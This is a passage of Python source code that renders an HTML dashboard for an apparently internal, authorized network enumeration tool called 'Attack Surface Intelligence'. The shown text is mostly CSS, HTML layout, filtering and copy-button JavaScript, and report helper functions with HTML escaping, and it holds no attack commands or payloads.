  <meta name="color-scheme" content="dark">
  <title>Attack Surface Intelligence - {h(state.run_id)}</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Urbanist:wght@500;600;700;800;900&family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
  <style>
    :root {{
      --bg: #0f172a;
      --bg-deep: #020617;
      --panel: rgba(30, 41, 59, 0.64);
      --panel-2: rgba(15, 23, 42, 0.92);
      --panel-solid: #172033;
      --panel-hover: rgba(30, 41, 59, 0.86);
      --panel-3: #020617;
      --line: rgba(255, 255, 255, 0.1);
      --line-strong: rgba(56, 189, 248, 0.28);
      --text: #ffffff;
      --text-soft: #cbd5e1;
      --muted: #94a3b8;
      --muted-2: #64748b;
      --faint: #64748b;
      --cyan: #38bdf8;
      --green: #10b981;
      --amber: #fbbf24;
      --red: #ef4444;
      --red-dark: #dc2626;
      --blue: #3b82f6;
      --blue-soft: #38bdf8;
      --orange: #f97316;
      --violet: #a78bfa;
      --radius: 10px;
      --font-display: "Urbanist", system-ui, sans-serif;
      --font-body: "Inter", system-ui, sans-serif;
      --font-mono: "JetBrains Mono", ui-monospace, monospace;
    }}
    * {{ box-sizing: border-box; }}
    html {{ scroll-behavior: smooth; }}
    body {{
      margin: 0;
      min-width: 320px;
      font-family: var(--font-body);
      background: var(--bg);
      color: var(--text);
      line-height: 1.55;
      letter-spacing: 0;
      -webkit-font-smoothing: antialiased;
    }}
    body::before {{
      content: "";
      position: fixed;
      inset: 0;
      pointer-events: none;
      background-image:
        linear-gradient(rgba(255,255,255,.025) 1px, transparent 1px),
        linear-gradient(90deg, rgba(255,255,255,.025) 1px, transparent 1px);
      background-size: 48px 48px;
      mask-image: linear-gradient(to bottom, black, transparent 82%);
      opacity: .72;
    }}
    button, input, select {{ font: inherit; }}
    header {{
      width: min(1520px, calc(100% - 40px));
      margin: 0 auto;
      padding: 28px 0 0;
      position: relative;
    }}
    .topbar {{
      display: flex;
      justify-content: space-between;
      align-items: center;
      gap: 18px;
      padding: 4px 0 24px;
    }}
    .brand {{
      display: flex;
      align-items: center;
      gap: 12px;
      font-family: var(--font-display);
      letter-spacing: .12em;
      font-weight: 900;
      text-transform: uppercase;
    }}
    .brand-mark {{
      color: var(--red);
      font: 800 1.35rem var(--font-mono);
      letter-spacing: -.12em;
    }}
    .brand-name {{
      font-size: 1.08rem;
    }}
    .brand-name span {{
      color: var(--text-soft);
      font-weight: 600;
    }}
    .report-id {{
      color: var(--muted);
      font: 500 .72rem var(--font-mono);
      text-transform: uppercase;
      letter-spacing: .11em;
    }}
    .hero {{
      overflow: hidden;
      position: relative;
      border: 1px solid var(--line);
      background: linear-gradient(135deg, rgba(30,41,59,.88), rgba(15,23,42,.76));
      border-radius: 14px;
      padding: clamp(28px, 5vw, 58px);
      box-shadow: 0 26px 70px rgba(2, 6, 23, .34);
    }}
    .hero::before {{
      content: "";
      position: absolute;
      inset: 0 auto auto 0;
      width: 100%;
      height: 2px;
      background: linear-gradient(90deg, var(--red), var(--blue-soft), transparent 76%);
    }}
    .eyebrow {{
      display: inline-flex;
      align-items: center;
      gap: 9px;
      margin-bottom: 18px;
      padding: 7px 10px;
      border: 1px solid rgba(239,68,68,.30);
      border-radius: 4px;
      background: rgba(239,68,68,.08);
      color: var(--text-soft);
      font: 700 .72rem var(--font-mono);
      text-transform: uppercase;
      letter-spacing: .12em;
    }}
    .eyebrow strong {{ color: var(--red); }}
    .hero-copy {{
      max-width: 790px;
      color: var(--text-soft);
      font: 500 1rem/1.8 var(--font-mono);
      margin: 24px 0 0;
    }}
    h1 {{
      margin: 0;
      font-family: var(--font-display);
      font: 800 clamp(2.25rem, 5vw, 4.7rem)/.98 var(--font-display);
      letter-spacing: -.035em;
      max-width: 900px;
    }}
    h1 span {{
      display: block;
      color: var(--red);
    }}
    .subtitle {{
      margin-top: 8px;
      color: var(--muted);
      max-width: 920px;
      line-height: 1.55;
    }}
    main {{
      width: min(1520px, calc(100% - 40px));
      margin: 0 auto;
      padding: 24px 0 72px;
      position: relative;
    }}
    .stats {{
      display: grid;
      grid-template-columns: repeat(5, minmax(0, 1fr));
      gap: 14px;
      margin: 24px 0 18px;
    }}
    .stat {{
      background: var(--panel);
      border: 1px solid var(--line);
      border-radius: var(--radius);
      padding: 19px;
      min-height: 104px;
      backdrop-filter: blur(12px);
      transition: border-color .2s, transform .2s, background .2s;
    }}
    .stat:hover {{
      border-color: rgba(56,189,248,.34);
      background: var(--panel-hover);
      transform: translateY(-2px);
    }}
    .stat span {{
      display: block;
      color: var(--muted);
      font-family: var(--font-mono);
      font-size: .68rem;
      text-transform: uppercase;
      letter-spacing: .08em;
      font-weight: 700;
    }}
    .stat strong {{
      display: block;
      margin-top: 8px;
      font-family: var(--font-display);
      font-size: 2rem;
      font-weight: 800;
    }}
    .filters {{
      display: grid;
      grid-template-columns: minmax(220px, 1fr) repeat(4, minmax(130px, 190px));
      gap: 10px;
      margin: 14px 0 16px;
    }}
    input, select {{
      width: 100%;
      border: 1px solid var(--line);
      background: rgba(2,6,23,.56);
      color: var(--text-soft);
      padding: 10px 12px;
      border-radius: 4px;
      outline: none;
      font: 500 .78rem var(--font-mono);
      transition: border-color .2s, box-shadow .2s;
    }}
    input:focus, select:focus {{
      border-color: var(--blue-soft);
      box-shadow: 0 0 0 3px rgba(56,189,248,.09);
    }}
    input::placeholder {{
      color: var(--faint);
    }}
    .tabs {{
      display: flex;
      gap: 8px;
      flex-wrap: wrap;
      padding: 8px;
      margin: 0 0 20px;
      border: 1px solid var(--line);
      border-radius: var(--radius);
      background: rgba(2, 6, 23, 0.56);
    }}
    .tab-button {{
      border: 1px solid transparent;
      background: transparent;
      color: var(--muted);
      padding: 9px 12px;
      border-radius: 4px;
      cursor: pointer;
      font-family: var(--font-mono);
      font-size: 12px;
      font-weight: 700;
      text-transform: uppercase;
    }}
    .tab-button:hover,
    .tab-button.active {{
      color: var(--text);
      border-color: var(--line-strong);
      background: rgba(56, 189, 248, 0.08);
    }}
    .tab-panel {{ display: none; }}
    .tab-panel.active {{ display: block; }}
    section {{
      margin-top: 20px;
    }}
    h2 {{
      margin: 0 0 12px;
      font-family: var(--font-display);
      font-size: 20px;
      font-weight: 800;
    }}
    h3 {{
      margin: 18px 0 10px;
      font-family: var(--font-display);
      font-size: 15px;
      color: var(--text);
      font-weight: 800;
    }}
    .overview-grid {{
      display: grid;
      grid-template-columns: minmax(260px, 1.35fr) minmax(260px, 1fr);
      gap: 14px;
    }}
    .overview-charts-panel {{
      grid-column: 1 / -1;
      padding: 24px;
    }}
    .panel {{
      border: 1px solid var(--line);
      border-radius: var(--radius);
      background: var(--panel);
      padding: 22px;
      backdrop-filter: blur(12px);
      box-shadow: 0 18px 44px rgba(2, 6, 23, 0.22);
    }}
    .panel h2, .panel h3 {{ margin-top: 0; }}
    .group-list {{
      display: grid;
      gap: 10px;
    }}
    details.group-item,
    details.port-item {{
      border: 1px solid var(--line);
      border-radius: 8px;
      background: var(--panel);
    }}
    details.group-item[open],
    details.port-item[open],
    details.table-section[open] {{
      border-color: var(--line-strong);
      background: rgba(15, 23, 42, 0.94);
      box-shadow: 0 0 0 1px rgba(56, 189, 248, 0.13), 0 18px 42px rgba(2, 6, 23, 0.42);
    }}
    details.port-item {{
      background: rgba(2, 6, 23, 0.7);
    }}
    details > summary {{
      cursor: pointer;
      list-style: none;
    }}
    details > summary::-webkit-details-marker {{ display: none; }}
    .group-item > summary,
    .port-item > summary {{
      display: flex;
      align-items: center;
      justify-content: space-between;
      gap: 12px;
      padding: 12px 14px;
    }}
    .group-item[open] > summary,
    .port-item[open] > summary,
    .table-section[open] > summary {{
      background: linear-gradient(90deg, rgba(56, 189, 248, 0.12), rgba(15, 23, 42, 0.84));
      border-radius: 7px 7px 0 0;
      border-bottom: 1px solid var(--line-strong);
    }}
    .summary-title {{
      display: flex;
      align-items: baseline;
      gap: 10px;
      min-width: 0;
      flex-wrap: wrap;
    }}
    .summary-title strong {{
      font-size: 15px;
      overflow-wrap: anywhere;
    }}
    .summary-pills {{
      display: flex;
      gap: 6px;
      align-items: center;
      justify-content: flex-end;
      flex-wrap: wrap;
    }}
    .metric {{
      display: inline-flex;
      gap: 5px;
      align-items: baseline;
      color: var(--muted);
      border: 1px solid var(--line);
      border-radius: 999px;
      padding: 4px 8px;
      font-size: 12px;
      white-space: nowrap;
    }}
    .metric strong {{ color: var(--text); }}
    .group-body {{
      border-top: 1px solid var(--line);
      padding: 14px;
    }}
    details[open] > .group-body,
    details[open] > .table-section-body {{
      border-top-color: var(--line-strong);
    }}
    .kv-grid {{
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
      gap: 10px;
      margin-bottom: 12px;
    }}
    .kv {{
      min-width: 0;
      padding: 10px;
      border: 1px solid var(--line);
      border-radius: 6px;
      background: rgba(15, 23, 42, 0.72);
    }}
    .kv span {{
      display: block;
      color: var(--muted);
      font-family: var(--font-mono);
      font-size: 11px;
      text-transform: uppercase;
      font-weight: 800;
      margin-bottom: 4px;
    }}
    .kv strong, .kv div {{ overflow-wrap: anywhere; }}
    .port-list {{
      display: grid;
      gap: 8px;
    }}
    .web-list {{
      display: grid;
      gap: 8px;
    }}
    .web-item {{
      border: 1px solid var(--line);
      border-radius: 6px;
      background: rgba(15, 23, 42, 0.72);
      padding: 10px;
    }}
    .web-line {{
      display: grid;
      grid-template-columns: minmax(62px, 82px) minmax(220px, 1.3fr) minmax(120px, 0.45fr) minmax(170px, 0.9fr) minmax(170px, 0.85fr) minmax(210px, 0.95fr);
      gap: 8px;
      align-items: start;
    }}
    .web-row-head {{
      display: grid;
      grid-template-columns: minmax(62px, 82px) minmax(220px, 1.3fr) minmax(120px, 0.45fr) minmax(170px, 0.9fr) minmax(170px, 0.85fr) minmax(210px, 0.95fr);
      gap: 8px;
      padding: 0 10px 6px;
      color: var(--muted);
      font-size: 11px;
      font-weight: 800;
      text-transform: uppercase;
    }}
    .web-col {{
      min-width: 0;
      overflow-wrap: anywhere;
      word-break: break-word;
    }}
    .web-col-label {{
      display: none;
      color: var(--muted);
      font-size: 11px;
      font-weight: 800;
      text-transform: uppercase;
      margin-bottom: 3px;
    }}
    .web-url a {{
      overflow-wrap: anywhere;
      word-break: break-word;
    }}
    .web-title {{
      display: inline-flex;
      align-items: center;
      gap: 7px;
      min-width: 0;
      max-width: 100%;
    }}
    .favicon-img {{
      width: 18px;
      height: 18px;
      object-fit: contain;
      border-radius: 3px;
      background: rgba(255, 255, 255, 0.08);
      flex: 0 0 auto;
    }}
    .service-group-actions {{
      display: flex;
      gap: 8px;
      align-items: center;
      justify-content: space-between;
      flex-wrap: wrap;
      padding: 10px;
      margin-bottom: 12px;
      border: 1px solid var(--line);
      border-radius: 6px;
      background: rgba(15, 23, 42, 0.72);
    }}
    .command-details {{
      margin-top: 8px;
    }}
    .command-details summary {{
      color: var(--cyan);
      font-size: 12px;
      font-weight: 800;
    }}
    .command-list {{
      display: grid;
      gap: 10px;
      margin-top: 8px;
    }}
    .command-row {{
      border: 1px solid var(--line);
      border-radius: 6px;
      padding: 8px;
      background: rgba(2, 6, 23, 0.86);
    }}
    .command-row-head {{
      display: flex;
      justify-content: space-between;
      gap: 8px;
      align-items: center;
      margin-bottom: 6px;
    }}
    .command-text {{
      width: 100%;
      min-height: 56px;
      resize: vertical;
      border: 1px solid rgba(148, 163, 184, 0.24);
      border-radius: 6px;
      background: #020617;
      color: #e2e8f0;
      padding: 8px;
      font-family: var(--font-mono);
      font-size: 12px;
      line-height: 1.45;
    }}
    .raw-details {{
      margin-top: 8px;
      width: 100%;
    }}
    .raw-details summary {{
      cursor: pointer;
      color: var(--cyan);
      font-size: 12px;
      font-weight: 800;
      text-transform: uppercase;
    }}
    .raw-body {{
      display: grid;
      gap: 8px;
      margin-top: 8px;
    }}
    .raw-toolbar {{
      display: flex;
      align-items: center;
      gap: 8px;
      flex-wrap: wrap;
    }}
    .raw-output {{
      width: 100%;
      min-height: 220px;
      max-height: 520px;
      resize: vertical;
      overflow: auto;
      border: 1px solid rgba(148, 163, 184, 0.24);
      border-radius: 6px;
      background: #020617;
      color: #e2e8f0;
      padding: 10px;
      font-family: var(--font-mono);
      font-size: 12px;
      line-height: 1.45;
      white-space: pre;
    }}
    .copy-buffer {{
      position: fixed;
      left: -9999px;
      top: -9999px;
      width: 1px;
      height: 1px;
      opacity: 0;
      pointer-events: none;
    }}
    .copy-actions {{
      display: flex;
      flex-wrap: wrap;
      gap: 6px;
    }}
    .fuzz-buttons,
    .global-fuzz-actions {{
      display: flex;
      flex-wrap: wrap;
      gap: 6px;
      align-items: center;
    }}
    .global-fuzz-actions {{
      margin-top: 10px;
    }}
    .web-fuzz-ip-list {{
      display: grid;
      grid-template-columns: repeat(3, minmax(0, 1fr));
      gap: 10px;
      margin: 12px 0;
    }}
    .web-fuzz-ip-row {{
      display: grid;
      grid-template-columns: 1fr;
      gap: 8px;
      align-items: start;
      border: 1px solid var(--line);
      border-radius: 6px;
      background: rgba(15, 23, 42, 0.72);
      padding: 10px;
    }}
    .web-fuzz-ip-row .global-fuzz-actions {{
      margin-top: 0;
    }}
    .web-meta {{
      display: inline-flex;
      gap: 6px;
      align-items: center;
      flex-wrap: wrap;
    }}
    .copy-btn {{
      border: 1px solid rgba(56, 189, 248, 0.34);
      background: rgba(56, 189, 248, 0.08);
      color: #e0f2fe;
      border-radius: 4px;
      padding: 6px 9px;
      cursor: pointer;
      font-family: var(--font-mono);
      font-size: 12px;
      font-weight: 800;
      text-transform: uppercase;
    }}
    .copy-btn:hover {{
      border-color: var(--cyan);
      color: var(--text);
      background: rgba(56, 189, 248, 0.16);
    }}
    a.copy-btn:hover {{
      text-decoration: none;
    }}
    .copy-btn.copied {{
      border-color: var(--green);
      color: var(--green);
    }}
    .attention-toggle {{
      width: 100%;
      margin-top: 10px;
      border: 1px solid rgba(56, 189, 248, 0.34);
      background: rgba(56, 189, 248, 0.08);
      color: #e0f2fe;
      border-radius: 4px;
      padding: 8px 10px;
      cursor: pointer;
      font-family: var(--font-mono);
      font-size: 12px;
      font-weight: 800;
      text-transform: uppercase;
    }}
    .attention-toggle:hover {{
      border-color: var(--cyan);
      color: var(--text);
      background: rgba(56, 189, 248, 0.16);
    }}
    .inline-web-list summary,
    .table-section summary {{
      cursor: pointer;
      color: var(--cyan);
      font-weight: 800;
    }}
    .inline-web-body {{
      display: grid;
      gap: 8px;
      margin-top: 8px;
    }}
    .inline-web-item {{
      border: 1px solid var(--line);
      border-radius: 6px;
      padding: 8px;
      background: rgba(2, 6, 23, 0.72);
    }}
    .table-section {{
      border: 1px solid var(--line);
      border-radius: 8px;
      background: var(--panel);
      margin-bottom: 12px;
    }}
    .table-section > summary {{
      padding: 12px 14px;
    }}
    .table-section-body {{
      border-top: 1px solid var(--line);
      padding: 12px;
    }}
    .chart-grid {{
      display: grid;
      grid-template-columns: repeat(2, minmax(320px, 1fr));
      gap: 16px;
      margin-top: 14px;
    }}
    .chart {{
      border: 1px solid var(--line);
      border-radius: var(--radius);
      background: rgba(2, 6, 23, 0.72);
      padding: 18px;
      min-height: 300px;
    }}
    .pie-chart {{
      display: grid;
      grid-template-columns: minmax(190px, 0.62fr) minmax(180px, 1fr);
      gap: 18px;
      align-items: center;
    }}
    .pie-donut {{
      width: min(220px, 100%);
      aspect-ratio: 1;
      border-radius: 50%;
      position: relative;
      border: 1px solid rgba(255, 255, 255, 0.08);
      box-shadow: inset 0 0 0 1px rgba(2, 6, 23, 0.34);
    }}
    .pie-donut::after {{
      content: "";
      position: absolute;
      inset: 28%;
      border-radius: 50%;
      background: #020617;
      border: 1px solid rgba(255, 255, 255, 0.08);
    }}
    .chart-legend {{
      display: grid;
      gap: 7px;
    }}
    .legend-row,
    .chart-row {{
      display: grid;
      grid-template-columns: minmax(96px, 1fr) auto;
      gap: 8px;
      align-items: center;
      font-size: 12px;
    }}
    .legend-label {{
      display: inline-flex;
      gap: 7px;
      align-items: center;
      min-width: 0;
    }}
    .legend-swatch {{
      width: 10px;
      height: 10px;
      border-radius: 999px;
      flex: 0 0 auto;
    }}
    .legend-row span:last-child,
    .chart-row strong {{
      font-family: var(--font-mono);
      color: var(--text);
    }}
    .hbar-list {{
      display: grid;
      gap: 10px;
    }}
    .hbar-row {{
      display: grid;
      grid-template-columns: minmax(180px, 0.74fr) minmax(180px, 1fr) 42px;
      gap: 10px;
      align-items: center;
      font-size: 12px;
    }}
    .hbar-label {{
      min-width: 0;
      overflow-wrap: anywhere;
      color: var(--muted);
    }}
    .bar-track,
    .hbar-track {{
      height: 9px;
      border-radius: 999px;
      background: rgba(15, 23, 42, 0.95);
      overflow: hidden;
    }}
    .bar-fill,
    .hbar-fill {{
      height: 100%;
      border-radius: 999px;
      background: var(--cyan);
    }}
    .chart-note {{
      margin-top: 9px;
      color: var(--muted-2);
      font-size: 12px;
    }}
    pre {{
      margin: 8px 0 0;
      padding: 10px;
      background: #020617;
      border: 1px solid var(--line);
      border-radius: 6px;
      overflow: auto;
      white-space: pre-wrap;
      overflow-wrap: anywhere;
    }}
    code {{
      font-family: var(--font-mono);
      font-size: 12px;
      color: #dfe7ef;
    }}
    .evidence-list {{
      display: grid;
      gap: 8px;
      margin: 0;
      padding: 0;
      list-style: none;
    }}
    .evidence-list li {{
      border-left: 3px solid var(--line);
      padding: 8px 10px;
      background: rgba(15, 23, 42, 0.72);
      border-radius: 4px;
    }}
    .evidence-list li.sev-high {{ border-color: var(--red); }}
    .evidence-list li.sev-medium {{ border-color: var(--amber); }}
    .evidence-list li.sev-low {{ border-color: var(--blue); }}
    .evidence-list li.sev-info {{ border-color: var(--muted); }}
    .enum-details {{
      margin-top: 10px;
      border: 1px solid var(--line);
      border-radius: var(--radius);
      background: rgba(2, 6, 23, 0.56);
      overflow: hidden;
    }}
    .enum-details > summary {{
      padding: 12px 14px;
      cursor: pointer;
      color: var(--cyan);
      font: 800 12px var(--font-mono);
      text-transform: uppercase;
      letter-spacing: .06em;
    }}
    .enum-list {{
      display: grid;
      gap: 8px;
      max-height: 360px;
      overflow: auto;
      padding: 0 12px 12px;
    }}
    .enum-item {{
      border: 1px solid var(--line);
      border-radius: 6px;
      background: rgba(15, 23, 42, 0.72);
    }}
    .enum-item > summary {{
      display: flex;
      justify-content: space-between;
      gap: 10px;
      padding: 10px;
      cursor: pointer;
      color: var(--text-soft);
    }}
    .enum-body {{
      border-top: 1px solid var(--line);
      padding: 10px;
      color: var(--muted);
    }}
    .enum-data {{
      max-height: 180px;
      overflow: auto;
      margin-top: 8px;
      border: 1px solid var(--line);
      border-radius: 6px;
      background: #020617;
      padding: 8px;
      font: 500 12px/1.55 var(--font-mono);
      white-space: pre-wrap;
      overflow-wrap: anywhere;
    }}
    .enum-target-list {{
      display: grid;
      gap: 7px;
      margin-bottom: 10px;
    }}
    .enum-target-row {{
      display: flex;
      gap: 8px;
      flex-wrap: wrap;
      align-items: baseline;
      padding: 7px 8px;
      border: 1px solid var(--line);
      border-radius: 6px;
      background: rgba(2, 6, 23, 0.5);
    }}
    .table-wrap {{
      overflow: auto;
      border: 1px solid var(--line);
      border-radius: 8px;
      background: rgba(2, 6, 23, 0.76);
    }}
    table {{
      width: 100%;
      border-collapse: collapse;
      min-width: 920px;
    }}
    th, td {{
      padding: 10px 12px;
      border-bottom: 1px solid var(--line);
      text-align: left;
      vertical-align: top;
      font-size: 13px;
    }}
    th {{
      position: sticky;
      top: 0;
      background: #0f172a;
      color: var(--muted);
      text-transform: uppercase;
      font-size: 11px;
      z-index: 1;
    }}
    tr:hover td {{ background: rgba(56, 189, 248, 0.06); }}
    a {{ color: var(--cyan); text-decoration: none; }}
    a:hover {{ text-decoration: underline; }}
    .dc-host {{
      border-left: 3px solid var(--violet) !important;
      background: rgba(167, 139, 250, 0.06) !important;
    }}
    .pill {{
      display: inline-flex;
      align-items: center;
      border: 1px solid var(--line);
      border-radius: 999px;
      padding: 3px 8px;
      margin: 1px 3px 1px 0;
      color: var(--muted);
      white-space: nowrap;
      font-size: 12px;
    }}
    .sev-high {{ color: var(--red); }}
    .sev-medium {{ color: var(--amber); }}
    .sev-low {{ color: var(--blue); }}
    .sev-info {{ color: var(--muted); }}
    .mono {{ font-family: var(--font-mono); }}
    .muted {{ color: var(--muted); }}
    .empty {{
      color: var(--muted);
      border: 1px dashed var(--line);
      border-radius: 8px;
      padding: 14px;
      background: rgba(2, 6, 23, 0.72);
    }}
    .hidden {{ display: none; }}
    .nowrap {{ white-space: nowrap; }}
    @media (max-width: 900px) {{
      header, main {{ width: min(100% - 32px, 1520px); }}
      .topbar {{ align-items: flex-start; flex-direction: column; }}
      .stats {{ grid-template-columns: repeat(2, minmax(0, 1fr)); }}
      .filters {{ grid-template-columns: 1fr 1fr; }}
      .overview-grid {{ grid-template-columns: 1fr; }}
      .chart-grid {{ grid-template-columns: 1fr; }}
      .pie-chart {{ grid-template-columns: 1fr; }}
      .pie-donut {{ max-width: 190px; }}
      .web-line,
      .web-row-head {{ grid-template-columns: minmax(58px, 80px) minmax(220px, 1fr) minmax(120px, 0.55fr); }}
      .web-fuzz-ip-list {{ grid-template-columns: repeat(2, minmax(0, 1fr)); }}
      .web-fuzz-ip-row {{ grid-template-columns: 1fr; }}
      table {{ min-width: 760px; }}
    }}
    @media (max-width: 560px) {{
      header, main {{ width: calc(100% - 28px); }}
      .hero {{ padding: 24px; }}
      .stats {{ grid-template-columns: 1fr; }}
      .filters {{ grid-template-columns: 1fr; }}
      .web-fuzz-ip-list {{ grid-template-columns: 1fr; }}
      .hbar-row {{ grid-template-columns: 1fr 44px; }}
      .hbar-track {{ grid-column: 1 / -1; }}
      .group-item > summary,
      .port-item > summary {{ align-items: flex-start; flex-direction: column; }}
      .summary-pills {{ justify-content: flex-start; }}
      .web-line {{ grid-template-columns: 1fr; }}
      .web-row-head {{ display: none; }}
      .web-col-label {{ display: block; }}
    }}
  </style>
</head>
<body>
  <header>
    <div class="topbar">
      <div class="brand"><span class="brand-mark">&gt;_</span><span class="brand-name">Attack Surface <span>Intelligence</span></span></div>
      <div class="report-id">Run {h(state.run_id)}</div>
    </div>
    <div class="hero">
      <div class="eyebrow"><strong>{h(APP_NAME)}</strong><span>authorized internal enum</span></div>
      <h1>Attack Surface <span>Intelligence</span></h1>
      <div class="hero-copy">
        Execução <span class="mono">{h(state.run_id)}</span> iniciada em <span class="mono">{h(state.started_at)}</span>.
        Relatório agrupado para revisar exposição por host, por tipo de serviço e por endpoint web.
      </div>
    </div>
  </header>
  <main>
    <div class="stats">
      {stat_card("Hosts ativos", len(hosts))}
      {stat_card("Serviços identificados", len(services))}
      {stat_card("URLs WEB", len(web_roots))}
      {stat_card("Evidências", len(evidence))}
      {stat_card("Ocorrências medium+", sum(1 for item in evidence if item.severity in {"high", "medium"}))}
    </div>
    <div class="filters">
      <input id="q" placeholder="Filtrar IP, host, serviço, porta, título, header ou path">
      <select id="sev"><option value="">Todas severidades</option><option>high</option><option>medium</option><option>low</option><option>info</option></select>
      <select id="cat"><option value="">Todas categorias</option>{category_options(evidence)}</select>
      <select id="svc"><option value="">Todos serviços</option>{service_options(services)}</select>
      <select id="code"><option value="">Todos status HTTP</option>{status_options(web_endpoints)}</select>
    </div>
    <nav class="tabs" aria-label="Visões do dashboard">
      <button class="tab-button active" type="button" data-tab-target="overview">Resumo</button>
      <button class="tab-button" type="button" data-tab-target="hosts">Por Host</button>
      <button class="tab-button" type="button" data-tab-target="service-groups">Por Serviço</button>
      <button class="tab-button" type="button" data-tab-target="tables">Tabelas</button>
    </nav>

    <section id="tab-overview" class="tab-panel active">
      {overview_panel(hosts, services, web_endpoints, evidence, state)}
    </section>

    <section id="tab-hosts" class="tab-panel">
      <h2>Agrupado por Host</h2>
      {host_group_dashboard(hosts, services, web_endpoints, evidence, state)}
    </section>

    <section id="tab-service-groups" class="tab-panel">
      <h2>Agrupado por Tipo de Serviço</h2>
      {service_group_dashboard(services, web_endpoints, evidence, state)}
    </section>

    <section id="tab-tables" class="tab-panel">
      <h2>Tabelas</h2>
      {table_section("Catálogo Web", web_table(web_endpoints, services, state), len(web_catalog))}
      {table_section("Serviços", services_table(services, state), len(services))}
      {table_section("Hosts", hosts_table(hosts, dc_ips), len(hosts))}
      {table_section("Dependências", dependencies_table(state.dependencies), len(state.dependencies))}
    </section>
  </main>
  <script>
    const q = document.getElementById('q');
    const sev = document.getElementById('sev');
    const cat = document.getElementById('cat');
    const svc = document.getElementById('svc');
    const code = document.getElementById('code');
    const filterItems = Array.from(document.querySelectorAll('[data-filter]'));
    const tabButtons = Array.from(document.querySelectorAll('.tab-button'));
    const tabPanels = Array.from(document.querySelectorAll('.tab-panel'));

    function applyFilters() {{
      const query = q.value.trim().toLowerCase();
      const sevValue = sev.value.toLowerCase();
      const catValue = cat.value.toLowerCase();
      const svcValue = svc.value.toLowerCase();
      const codeValue = code.value.toLowerCase();
      filterItems.forEach(item => {{
        const text = item.dataset.filter || '';
        const ok =
          (!query || text.includes(query)) &&
          (!sevValue || (item.dataset.severity || '').toLowerCase() === sevValue) &&
          (!catValue || (item.dataset.category || '').toLowerCase() === catValue) &&
          (!svcValue || (item.dataset.service || '').toLowerCase() === svcValue) &&
          (!codeValue || (item.dataset.code || '').toLowerCase() === codeValue);
        item.classList.toggle('hidden', !ok);
      }});
    }}

    function activateTab(name) {{
      tabButtons.forEach(button => button.classList.toggle('active', button.dataset.tabTarget === name));
      tabPanels.forEach(panel => panel.classList.toggle('active', panel.id === `tab-${{name}}`));
    }}

    tabButtons.forEach(button => {{
      button.addEventListener('click', () => activateTab(button.dataset.tabTarget));
    }});
    document.addEventListener('click', event => {{
      const details = event.target.closest('details.inline-web-list');
      document.querySelectorAll('details.inline-web-list').forEach(d => {{
        if (d !== details) d.removeAttribute('open');
      }});
      const attentionButton = event.target.closest('[data-attention-toggle]');
      if (attentionButton) {{
        const panel = attentionButton.closest('.panel');
        if (!panel) return;
        panel.querySelectorAll('.attention-extra').forEach(item => item.classList.remove('hidden'));
        attentionButton.remove();
        return;
      }}
      const button = event.target.closest('.copy-btn');
      if (!button) return;
      const targetId = button.dataset.copyTarget;
      const directValue = button.dataset.copyValue;
      const target = targetId ? document.getElementById(targetId) : null;
      const text = target ? target.value : directValue;
      if (!text) return;
      const done = () => {{
        const old = button.textContent;
        button.textContent = 'Copiado';
        button.classList.add('copied');
        setTimeout(() => {{
          button.textContent = old;
          button.classList.remove('copied');
          const parentDetails = button.closest('details.inline-web-list');
          if (parentDetails) parentDetails.removeAttribute('open');
        }}, 1200);
      }};
      if (navigator.clipboard && window.isSecureContext) {{
        navigator.clipboard.writeText(text).then(done).catch(() => {{}});
      }} else {{
        const area = document.createElement('textarea');
        area.value = text;
        area.style.position = 'fixed';
        area.style.left = '-9999px';
        document.body.appendChild(area);
        area.focus();
        area.select();
        try {{ document.execCommand('copy'); done(); }} catch (err) {{}}
        area.remove();
      }}
    }});
    [q, sev, cat, svc, code].forEach(el => el.addEventListener('input', applyFilters));
  </script>
</body>
</html>
"""
    private_write_text(report_path, html_text)
    report_path.chmod(0o600)
    return report_path


def h(value: Any) -> str:
    text = str(value if value is not None else "")
    text = re.sub(r"[\x00-\x08\x0b\x0c\x0e-\x1f\x7f]", "", text)
    return html.escape(text, quote=True)


def stat_card(label: str, value: int) -> str:
    return f'<div class="stat"><span>{h(label)}</span><strong>{h(value)}</strong></div>'


def table_section(title: str, content: str, count: int) -> str:
    return (
        '<details class="table-section">'
        f"<summary>{h(title)} <span class=\"metric\"><strong>{h(count)}</strong>itens</span></summary>"
        f'<div class="table-section-body">{content}</div>'
        "</details>"
    )


def overview_panel(
    hosts: list[HostRecord],
    services: list[ServiceRecord],
    endpoints: list[WebEndpoint],
    evidence: list[Evidence],
    state: ScanState,
) -> str:
    group_counts = service_group_counts(services)
    group_rows = []
    for name, count in sorted(group_counts.items(), key=lambda item: (-item[1], item[0])):
        group_rows.append(
            f'<div class="kv" data-filter="{row_filter(name, count)}" data-service="{h(name)}">'
            f"<span>{h(name)}</span><strong>{h(count)} serviço(s)</strong></div>"
        )
    if not group_rows:
        group_rows.append(empty_state("Nenhum serviço catalogado."))

    medium_plus = [item for item in evidence if item.severity in {"high", "medium"}]
    attention_items = medium_plus or evidence
    attention_html = attention_compact_list(attention_items, initial=4)
    web_hosts = len({endpoint.ip for endpoint in endpoints if is_reportable_web_endpoint(endpoint)})
    web_ports = len({(service.ip, service.port) for service in services if is_web_service(service)})
    reportable_urls = len(web_root_catalog_endpoints(services, endpoints))
    web_evidence_urls = {str(item.data.get("url")) for item in evidence if item.category == "web" and item.data.get("url")}
    prioritized_web = len([endpoint for endpoint in endpoints if endpoint.interesting or endpoint.url in web_evidence_urls])
    unique_ports = len({(svc.port, svc.protocol) for svc in services})
    local_domains = discovered_local_domains(hosts)
    charts_html = overview_charts(hosts, services, endpoints)
    overview = f"""
      <div class="overview-grid">
        <div class="panel overview-charts-panel">
          <h2>Gráficos de Superfície</h2>
          {charts_html}
        </div>
        {kerberos_attacks_summary_html(state)}
        <div class="panel">
          <h2>Mapa Rápido</h2>
          <div class="kv-grid">
            <div class="kv"><span>Domínios locais</span><div>{domain_summary_html(local_domains, state)}</div></div>
            <div class="kv"><span>Hosts catalogados</span><strong>{h(len(hosts))}</strong></div>
            <div class="kv"><span>Portas abertas</span><strong>{h(len(services))}</strong></div>
            <div class="kv"><span>Hosts com web</span><strong>{h(web_hosts)}</strong></div>
            <div class="kv"><span>Portas WEB</span><strong>{h(web_ports)}</strong></div>
